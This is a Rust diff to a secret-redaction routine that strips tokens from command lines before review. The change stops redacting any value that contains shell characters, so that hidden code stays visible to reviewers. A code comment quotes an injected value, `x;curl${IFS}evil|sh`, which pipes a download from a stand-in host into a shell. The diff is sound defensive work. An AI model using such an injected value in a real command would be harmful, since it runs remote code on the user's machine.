@@ -2,13 +2,17 @@
 //! item's text: a command line is where a token is written when it is not
 //! in a variable (`"apiKeyHelper": "echo sk-ant-…"`, `--api-key …`, a header
 //! for `curl`). What is taken out is hidden from the local rules and the AI
-//! alike, so only a value is: never a word that could be a command, never a
+//! alike, and a payload hidden in it would go unread, so only what can be
+//! nothing but a value is: a run of token characters (see
+//! `is_token_shaped`), never a word with a shell character in it, never a
 //! path or an expansion (`$TOKEN`), which are what a review needs to see.
+//!
+//! Not covered, and sent as written: a secret in a header other than
+//! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
+//! after a flag named for authorization rather than a secret
+//! (`--authorization v`), and a quoted value of several words.
 
-use crate::sweep::judge::secrets::is_secret_name;
-
-/// What stands where a value was taken out.
-pub(super) const VALUE_NOT_READ: &str = "<value-not-read>";
+use crate::sweep::judge::secrets::{REDACTED, is_secret_name};
 
 /// The beginnings of tokens that say what they are by themselves: Anthropic
 /// and `OpenAI` keys, GitHub, GitLab, Slack, AWS, Google, npm and `PyPI` tokens.
@@ -54,7 +58,7 @@ enum Next {
     Value,
 }
 
-/// `line` with the secrets in it taken out, as `VALUE_NOT_READ`:
+/// `line` with the secrets in it taken out, as `REDACTED`:
 ///
 /// - who an address logs in as (`scheme://user:password@`, the whole of it);
 /// - the value of an `Authorization:` header, after its scheme where it has
@@ -64,8 +68,8 @@ enum Next {
 /// - the word after a flag named for a secret (`--api-key x`);
 /// - a word that is a token by its look (see `is_token`).
 ///
-/// The line is read word by word, as blanks split it; quotes around a word
-/// stay where they are.
+/// Each only where it is token-shaped. The line is read word by word, as
+/// blanks split it; quotes around a word stay where they are.
 pub(super) fn redacted(line: &str) -> String {
     let mut out = String::with_capacity(line.len());
     let mut next = Next::Word;
@@ -100,23 +104,23 @@ fn redacted_word(word: &str, next: &mut Next) -> String {
     let asked = std::mem::replace(next, Next::Word);
     let lower = core.to_ascii_lowercase();
     let core = if matches!(lower.as_str(), "bearer" | "basic")
-        || (asked == Next::Value && is_scheme(&lower))
+        || (asked == Next::Value && is_auth_scheme(&lower))
         || lower.ends_with("authorization:")
     {
         *next = Next::Value;
         core.to_string()
     } else if asked == Next::Value {
-        value(core)
+        value(core).to_string()
     } else if let Some((header, rest)) = lower
         .split_once("authorization:")
         .filter(|(_, rest)| !rest.is_empty())
     {
         let name_end = header.len() + "authorization:".len();
-        if is_scheme(rest) {
+        if is_auth_scheme(rest) {
             *next = Next::Value;
             core.to_string()
         } else {
-            format!("{}{VALUE_NOT_READ}", &core[..name_end])
+            format!("{}{}", &core[..name_end], value(&core[name_end..]))
         }
     } else {
         let core = without_login(core);
@@ -132,17 +136,29 @@ fn redacted_word(word: &str, next: &mut Next) -> String {
 
 /// Whether `lower` is the scheme of an `Authorization` header, which says
 /// what kind the value after it is (`Bearer x`, `token x`).
-fn is_scheme(lower: &str) -> bool {
+fn is_auth_scheme(lower: &str) -> bool {
     matches!(lower, "bearer" | "basic" | "token" | "digest")
 }
 
-/// `word` as the value of something named for a secret: taken out, unless
-/// it is an expansion or a path, which hold no secret themselves.
-fn value(word: &str) -> String {
-    if word.is_empty() || word.starts_with(['$', '/', '~', '.']) {
-        word.to_string()
+/// Whether `word` can be nothing but a value: token characters only
+/// (letters, digits and `._~%+=:/-_`), and not a path or an expansion.
+/// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
+/// code, and taking it out would hide it from the review.
+fn is_token_shaped(word: &str) -> bool {
+    !word.is_empty()
+        && !word.starts_with(['$', '/', '~', '.'])
+        && word
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._~%+=:/-_".contains(c))
+}
+
+/// `word` as the value of something named for a secret: taken out where it
+/// is token-shaped, else as written.
+fn value(word: &str) -> &str {
+    if is_token_shaped(word) {
+        REDACTED
     } else {
-        VALUE_NOT_READ.to_string()
+        word
     }
 }
 
@@ -166,14 +182,15 @@ fn without_assigned_secret(word: &str) -> String {
         name_end = value_start;
     }
     if is_token(word) {
-        VALUE_NOT_READ.to_string()
+        REDACTED.to_string()
     } else {
         word.to_string()
     }
 }
 
-/// `word` with who each address in it logs in as taken out:
-/// `git+https://ghp_x@github.com/r` is `git+https://github.com/r`.
+/// `word` with who each address in it logs in as taken out, where that is
+/// token-shaped: `git+https://ghp_x@github.com/r` is
+/// `git+https://github.com/r`.
 pub(super) fn without_login(word: &str) -> String {
     let mut out = String::with_capacity(word.len());
     let mut rest = word;
@@ -187,6 +204,7 @@ pub(super) fn without_login(word: &str) -> String {
         out.push_str(
             authority
                 .rsplit_once('@')
+                .filter(|(login, _)| is_token_shaped(login))
                 .map_or(authority, |(_, host)| host),
         );
         rest = &after[end..];
